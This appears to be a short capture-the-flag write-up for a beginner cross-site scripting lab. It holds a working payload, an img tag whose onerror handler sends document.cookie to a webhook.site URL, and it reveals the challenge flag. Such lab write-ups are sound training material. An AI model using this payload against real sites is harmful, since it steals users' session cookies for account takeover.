> Never hacked a website before? This is your guide.
> 
> Start instance

"Stealing cookies
Adding a heading doesn't do much damage. Instead we might want to steal the cookies of the user, which we can then use to login as them. This is what we will do:

Create an <img> tag, with an invalid src attribute
Execute code using the onerror attribute
Get the cookies using document.cookie
Send the cookies somewhere you can get them. You can for example use webhook.site"

My payload
Hi!

"For a real attack, a user would have to visit the page where you injected the HTML. In CTF competitions, we instead usually use a 'XSS bot', which is an automated program pretending to be a user. When you have made a payload which you believe will work, start the XSS bot!"

Start XSS bot
Status: Disconnected

With : 
<img src="invalid.jpg" onerror="fetch('https://webhook.site/7863c39c-dbaf-445b-8f0e-2c846395e198?cookie=' + encodeURIComponent(document.cookie))">
Preview:
Hi! 

After starting, in webhook, in Query strings, there is the cookie

<details>
<summary>Flag</summary>

`flag=NNS{wow_you_are_so_1337_03aab8c853c3}`

</details>
